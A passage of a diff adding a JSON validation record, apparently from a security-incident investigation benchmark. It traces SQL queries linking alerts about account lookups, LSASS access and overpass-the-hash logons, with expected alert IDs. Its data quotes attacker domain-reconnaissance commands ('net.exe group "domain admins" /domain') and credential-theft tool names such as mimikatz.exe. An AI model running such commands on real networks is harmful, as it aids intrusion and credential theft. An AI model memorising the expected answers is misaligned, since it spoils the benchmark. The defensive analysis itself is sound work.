+              "alert_id": "089b219f-5036-c9dd-915e-8ae23b514ed1",
+              "time": "2024-07-19 22:39:21.888087+00:00",
+              "source_row_hash": "1a73adbc66236ee120cf4f31b7ea6e92be3425978250eda442ada465893f425b",
+              "matched_inputs": [
+                "net.exe"
+              ]
+            }
+          ],
+          "witness_count": 27,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Command_File_Mention' AND o.Concept = 'Host_Name'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Anomalous account lookups",
+            "net.exe"
+          ],
+          "error": null
+        },
+        {
+          "step": "T2",
+          "episode_id": "em_afdcb0e9dc74c4fe",
+          "status": "ok",
+          "candidate_count": 243,
+          "unique_values": [
+            "get-krbticket.ps1",
+            "lsass.exe",
+            "mimikatz.exe",
+            "powershell.exe"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+          "witnesses": [
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "lsass.exe",
+              "raw_components": {
+                "CommandLine": "lsass.exe"
+              },
+              "roles": [],
+              "entity_index": 11,
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-15 22:39:22.394304+00:00",
+              "source_row_hash": "02ea8cb1e706b48e229d65e876b89a048d5c57a69f6e0af1bb058e706a422ebc",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "lsass.exe",
+              "raw_components": {
+                "CommandLine": "lsass.exe"
+              },
+              "roles": [],
+              "entity_index": 11,
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-18 22:36:02.468158+00:00",
+              "source_row_hash": "03262688d431df54a1fad9dd5f49b9c32fae0875119ff194281ecd14fe56eaac",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "lsass.exe",
+              "raw_components": {
+                "CommandLine": "lsass.exe"
+              },
+              "roles": [],
+              "entity_index": 11,
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-19 22:39:22.116411+00:00",
+              "source_row_hash": "071d155479edac0dc1db7946a9d74167c2cf33f845c0fefec78ec6638970c3cc",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            }
+          ],
+          "witness_count": 27,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Host_Name' AND o.Concept = 'Command_File_Mention'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Suspicious access to LSASS service",
+            "vnevado-win10v"
+          ],
+          "error": null
+        },
+        {
+          "step": "T3",
+          "episode_id": "em_9339ee7c75ce2525",
+          "status": "ok",
+          "candidate_count": 54,
+          "unique_values": [
+            "S-1-5-21-1540151660-3530000288-105586595-1517",
+            "S-2-2-78"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "a2464305-28e2-a97b-2fe0-d838c74f8294",
+          "witnesses": [
+            {
+              "concept": "Account_SID",
+              "graph_value": "S-2-2-78",
+              "raw_components": {
+                "Sid": "S-2-2-78"
+              },
+              "roles": [],
+              "entity_index": 4,
+              "alert_id": "a2464305-28e2-a97b-2fe0-d838c74f8294",
+              "time": "2024-07-22 22:39:52.099748+00:00",
+              "source_row_hash": "06f1dd45cf067f76c00e66a431ff3499d2307415ab31fecdae015689b193478f",
+              "matched_inputs": [
+                "lsass.exe"
+              ]
+            },
+            {
+              "concept": "Account_SID",
+              "graph_value": "S-2-2-78",
+              "raw_components": {
+                "Sid": "S-2-2-78"
+              },
+              "roles": [],
+              "entity_index": 4,
+              "alert_id": "a2464305-28e2-a97b-2fe0-d838c74f8294",
+              "time": "2024-07-13 22:34:39.321984+00:00",
+              "source_row_hash": "0bc8ba353a26e6ba50148e198faeff9b20320d5eb0f420a67fd2ddc58e3436ee",
+              "matched_inputs": [
+                "lsass.exe"
+              ]
+            },
+            {
+              "concept": "Account_SID",
+              "graph_value": "S-2-2-78",
+              "raw_components": {
+                "Sid": "S-2-2-78"
+              },
+              "roles": [],
+              "entity_index": 4,
+              "alert_id": "a2464305-28e2-a97b-2fe0-d838c74f8294",
+              "time": "2024-07-25 22:35:06.358102+00:00",
+              "source_row_hash": "11bb0ad4781b86ca2f6a1f71b52443a716303960e96ce45e901a730008f698ac",
+              "matched_inputs": [
+                "lsass.exe"
+              ]
+            }
+          ],
+          "witness_count": 27,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Command_File_Mention' AND o.Concept = 'Account_SID'\n  AND i.GraphValue IN (%s,%s,%s,%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Successful logon using overpass-the-hash with potentially stolen credentials",
+            "get-krbticket.ps1",
+            "lsass.exe",
+            "mimikatz.exe",
+            "powershell.exe"
+          ],
+          "error": null
+        }
+      ]
+    },
+    {
+      "variant": "route_74f8fd5d594a611c",
+      "seed_concept": "File_Name",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "episode_id": "em_bab3dcef4b9e19c5",
+          "status": "ok",
+          "candidate_count": 27,
+          "unique_values": [
+            "vnevado-win10v"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "089b219f-5036-c9dd-915e-8ae23b514ed1",
+          "witnesses": [
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "roles": [],
+              "entity_index": 20,
+              "alert_id": "089b219f-5036-c9dd-915e-8ae23b514ed1",
+              "time": "2024-07-17 22:34:56.408798+00:00",
+              "source_row_hash": "03d0074b1cc357fbfeb002a19692f400984dabdf5ff3ad9d8157b7ddeb719af8",
+              "matched_inputs": [
+                "domaindominance27.ps1"
+              ]
+            },
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "roles": [],
+              "entity_index": 20,
+              "alert_id": "089b219f-5036-c9dd-915e-8ae23b514ed1",
+              "time": "2024-07-19 22:35:15.157137+00:00",
+              "source_row_hash": "071eb279d249a99d9bb5eee1bc4d9cb705bfae6bfbe4f0571fabc13e89bae4a6",
+              "matched_inputs": [
+                "domaindominance27.ps1"
+              ]
+            },
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "roles": [],
+              "entity_index": 20,
+              "alert_id": "089b219f-5036-c9dd-915e-8ae23b514ed1",
+              "time": "2024-07-19 22:39:21.888087+00:00",
+              "source_row_hash": "1a73adbc66236ee120cf4f31b7ea6e92be3425978250eda442ada465893f425b",
+              "matched_inputs": [
+                "domaindominance27.ps1"
+              ]
+            }
+          ],
+          "witness_count": 27,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'File_Name' AND o.Concept = 'Host_Name'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Anomalous account lookups",
+            "domaindominance27.ps1"
+          ],
+          "error": null
+        },
+        {
+          "step": "T2",
+          "episode_id": "em_afdcb0e9dc74c4fe",
+          "status": "ok",
+          "candidate_count": 243,
+          "unique_values": [
+            "get-krbticket.ps1",
+            "lsass.exe",
+            "mimikatz.exe",
+            "powershell.exe"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+          "witnesses": [
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "lsass.exe",
+              "raw_components": {
+                "CommandLine": "lsass.exe"
+              },
+              "roles": [],
+              "entity_index": 11,
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-15 22:39:22.394304+00:00",
+              "source_row_hash": "02ea8cb1e706b48e229d65e876b89a048d5c57a69f6e0af1bb058e706a422ebc",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "lsass.exe",
+              "raw_components": {
+                "CommandLine": "lsass.exe"
+              },
+              "roles": [],
+              "entity_index": 11,
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-18 22:36:02.468158+00:00",
+              "source_row_hash": "03262688d431df54a1fad9dd5f49b9c32fae0875119ff194281ecd14fe56eaac",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "lsass.exe",
+              "raw_components": {
+                "CommandLine": "lsass.exe"
+              },
+              "roles": [],
+              "entity_index": 11,
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-19 22:39:22.116411+00:00",
+              "source_row_hash": "071d155479edac0dc1db7946a9d74167c2cf33f845c0fefec78ec6638970c3cc",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            }
+          ],
+          "witness_count": 27,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Host_Name' AND o.Concept = 'Command_File_Mention'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Suspicious access to LSASS service",
+            "vnevado-win10v"
+          ],
+          "error": null
+        },
+        {
+          "step": "T3",
+          "episode_id": "em_9339ee7c75ce2525",
+          "status": "ok",
+          "candidate_count": 54,
+          "unique_values": [
+            "S-1-5-21-1540151660-3530000288-105586595-1517",
+            "S-2-2-78"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "a2464305-28e2-a97b-2fe0-d838c74f8294",
+          "witnesses": [
+            {
+              "concept": "Account_SID",
+              "graph_value": "S-2-2-78",
+              "raw_components": {
+                "Sid": "S-2-2-78"
+              },
+              "roles": [],
+              "entity_index": 4,
+              "alert_id": "a2464305-28e2-a97b-2fe0-d838c74f8294",
+              "time": "2024-07-22 22:39:52.099748+00:00",
+              "source_row_hash": "06f1dd45cf067f76c00e66a431ff3499d2307415ab31fecdae015689b193478f",
+              "matched_inputs": [
+                "lsass.exe"
+              ]
+            },
+            {
+              "concept": "Account_SID",
+              "graph_value": "S-2-2-78",
+              "raw_components": {
+                "Sid": "S-2-2-78"
+              },
+              "roles": [],
+              "entity_index": 4,
+              "alert_id": "a2464305-28e2-a97b-2fe0-d838c74f8294",
+              "time": "2024-07-13 22:34:39.321984+00:00",
+              "source_row_hash": "0bc8ba353a26e6ba50148e198faeff9b20320d5eb0f420a67fd2ddc58e3436ee",
+              "matched_inputs": [
+                "lsass.exe"
+              ]
+            },
+            {
+              "concept": "Account_SID",
+              "graph_value": "S-2-2-78",
+              "raw_components": {
+                "Sid": "S-2-2-78"
+              },
+              "roles": [],
+              "entity_index": 4,
+              "alert_id": "a2464305-28e2-a97b-2fe0-d838c74f8294",
+              "time": "2024-07-25 22:35:06.358102+00:00",
+              "source_row_hash": "11bb0ad4781b86ca2f6a1f71b52443a716303960e96ce45e901a730008f698ac",
+              "matched_inputs": [
+                "lsass.exe"
+              ]
+            }
+          ],
+          "witness_count": 27,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Command_File_Mention' AND o.Concept = 'Account_SID'\n  AND i.GraphValue IN (%s,%s,%s,%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Successful logon using overpass-the-hash with potentially stolen credentials",
+            "get-krbticket.ps1",
+            "lsass.exe",
+            "mimikatz.exe",
+            "powershell.exe"
+          ],
+          "error": null
+        }
+      ]
+    },
+    {
+      "variant": "route_74f8fd5d594a611c",
+      "seed_concept": "Process_Identity",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "episode_id": "em_d1102041c654bb01",
+          "status": "ok",
+          "candidate_count": 135,
+          "unique_values": [
+            "vnevado-win10v"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "089b219f-5036-c9dd-915e-8ae23b514ed1",
+          "witnesses": [
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "roles": [],
+              "entity_index": 20,
+              "alert_id": "089b219f-5036-c9dd-915e-8ae23b514ed1",
+              "time": "2024-07-17 22:34:56.408798+00:00",
+              "source_row_hash": "03d0074b1cc357fbfeb002a19692f400984dabdf5ff3ad9d8157b7ddeb719af8",
+              "matched_inputs": [
+                "1700__2024-06-27t14:32:24.729893z__\"net.exe\" group \"enterprise admins\" /domain"
+              ]
+            },
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "roles": [],
+              "entity_index": 20,
+              "alert_id": "089b219f-5036-c9dd-915e-8ae23b514ed1",
+              "time": "2024-07-17 22:34:56.408798+00:00",
+              "source_row_hash": "03d0074b1cc357fbfeb002a19692f400984dabdf5ff3ad9d8157b7ddeb719af8",
+              "matched_inputs": [
+                "2720__2024-06-27t14:32:20.9965284z__\"net.exe\" user /domain"
+              ]
+            },
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "roles": [],
+              "entity_index": 20,
+              "alert_id": "089b219f-5036-c9dd-915e-8ae23b514ed1",
+              "time": "2024-07-17 22:34:56.408798+00:00",
+              "source_row_hash": "03d0074b1cc357fbfeb002a19692f400984dabdf5ff3ad9d8157b7ddeb719af8",
+              "matched_inputs": [
+                "3560__2024-06-27t14:32:37.0854938z__\"net.exe\" user fk8mq /domain"
+              ]
+            }
+          ],
+          "witness_count": 135,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Process_Identity' AND o.Concept = 'Host_Name'\n  AND i.GraphValue IN (%s,%s,%s,%s,%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Anomalous account lookups",
+            "1700__2024-06-27t14:32:24.729893z__\"net.exe\" group \"enterprise admins\" /domain",
+            "2720__2024-06-27t14:32:20.9965284z__\"net.exe\" user /domain",
+            "3560__2024-06-27t14:32:37.0854938z__\"net.exe\" user fk8mq /domain",
+            "6252__2024-06-27t14:32:23.4863625z__\"net.exe\" group \"domain admins\" /domain",
+            "6264__2024-06-27t14:32:22.2653632z__\"net.exe\" group /domain"
+          ],
+          "error": null
+        },
+        {
+          "step": "T2",
+          "episode_id": "em_afdcb0e9dc74c4fe",
+          "status": "ok",
+          "candidate_count": 243,
+          "unique_values": [
+            "get-krbticket.ps1",
+            "lsass.exe",
+            "mimikatz.exe",
+            "powershell.exe"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+          "witnesses": [
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "lsass.exe",
+              "raw_components": {
+                "CommandLine": "lsass.exe"
+              },
+              "roles": [],
+              "entity_index": 11,
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-15 22:39:22.394304+00:00",
+              "source_row_hash": "02ea8cb1e706b48e229d65e876b89a048d5c57a69f6e0af1bb058e706a422ebc",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "lsass.exe",
+              "raw_components": {
+                "CommandLine": "lsass.exe"
+              },
+              "roles": [],
+              "entity_index": 11,
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-18 22:36:02.468158+00:00",
+              "source_row_hash": "03262688d431df54a1fad9dd5f49b9c32fae0875119ff194281ecd14fe56eaac",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "lsass.exe",
+              "raw_components": {
+                "CommandLine": "lsass.exe"
+              },
+              "roles": [],
+              "entity_index": 11,
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-19 22:39:22.116411+00:00",
+              "source_row_hash": "071d155479edac0dc1db7946a9d74167c2cf33f845c0fefec78ec6638970c3cc",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            }
+          ],
+          "witness_count": 27,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Host_Name' AND o.Concept = 'Command_File_Mention'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Suspicious access to LSASS service",
+            "vnevado-win10v"
+          ],
+          "error": null
+        },
+        {
+          "step": "T3",
+          "episode_id": "em_9339ee7c75ce2525",
+          "status": "ok",
+          "candidate_count": 54,
+          "unique_values": [
+            "S-1-5-21-1540151660-3530000288-105586595-1517",
+            "S-2-2-78"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "a2464305-28e2-a97b-2fe0-d838c74f8294",
+          "witnesses": [
+            {
+              "concept": "Account_SID",
+              "graph_value": "S-2-2-78",
+              "raw_components": {
+                "Sid": "S-2-2-78"
+              },
+              "roles": [],
+              "entity_index": 4,
+              "alert_id": "a2464305-28e2-a97b-2fe0-d838c74f8294",
+              "time": "2024-07-22 22:39:52.099748+00:00",
+              "source_row_hash": "06f1dd45cf067f76c00e66a431ff3499d2307415ab31fecdae015689b193478f",
+              "matched_inputs": [
+                "lsass.exe"
+              ]
+            },
+            {
+              "concept": "Account_SID",
+              "graph_value": "S-2-2-78",
+              "raw_components": {
+                "Sid": "S-2-2-78"
+              },
+              "roles": [],
+              "entity_index": 4,
+              "alert_id": "a2464305-28e2-a97b-2fe0-d838c74f8294",
+              "time": "2024-07-13 22:34:39.321984+00:00",
+              "source_row_hash": "0bc8ba353a26e6ba50148e198faeff9b20320d5eb0f420a67fd2ddc58e3436ee",
+              "matched_inputs": [
+                "lsass.exe"
+              ]
+            },
+            {
+              "concept": "Account_SID",
+              "graph_value": "S-2-2-78",
+              "raw_components": {
+                "Sid": "S-2-2-78"
+              },
+              "roles": [],
+              "entity_index": 4,
+              "alert_id": "a2464305-28e2-a97b-2fe0-d838c74f8294",
+              "time": "2024-07-25 22:35:06.358102+00:00",
+              "source_row_hash": "11bb0ad4781b86ca2f6a1f71b52443a716303960e96ce45e901a730008f698ac",
+              "matched_inputs": [
+                "lsass.exe"
+              ]
+            }
+          ],
+          "witness_count": 27,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Command_File_Mention' AND o.Concept = 'Account_SID'\n  AND i.GraphValue IN (%s,%s,%s,%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Successful logon using overpass-the-hash with potentially stolen credentials",
+            "get-krbticket.ps1",
+            "lsass.exe",
+            "mimikatz.exe",
+            "powershell.exe"
+          ],
+          "error": null
+        }
+      ]
+    }
+  ],
+  "offline_scope": "Uses official start entities; no intermediate or target value supplied to queries. Expected values checked only after results.",
+  "live_scope": "Exported merged PM/EM; session-local MySQL projection of original CSV, membership from SecurityIncident.AlertIds. Official graph supplies seed, expected path checked only AFTER full route execution.",
+  "delta": {
+    "sm": 0,
+    "em": 0,
+    "pm": 1
+  },
+  "live_validation_v1": [
+    {
+      "variant": "from_Command_File_Mention",
+      "passed": false,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "invalid_json",
+          "candidate_count": 0,
+          "expected_present": false,
+          "error": "Expecting ',' delimiter: line 1 column 48 (char 47)",
+          "alert_id": "089b219f-5036-c9dd-915e-8ae23b514ed1"
+        }
+      ]
+    },
+    {
+      "variant": "from_File_Name",
+      "passed": false,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "invalid_json",
+          "candidate_count": 0,
+          "expected_present": false,
+          "error": "Expecting ',' delimiter: line 1 column 48 (char 47)",
+          "alert_id": "089b219f-5036-c9dd-915e-8ae23b514ed1"
+        }
+      ]
+    },
+    {
+      "variant": "from_Process_Identity",
+      "passed": false,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "invalid_json",
+          "candidate_count": 0,
+          "expected_present": false,
+          "error": "Expecting ',' delimiter: line 1 column 48 (char 47)",
+          "alert_id": "089b219f-5036-c9dd-915e-8ae23b514ed1"
+        }
+      ]
+    }
+  ],
+  "physical_revision": 2,
+  "verification": "exact_alert_and_edge_lineage"
+}
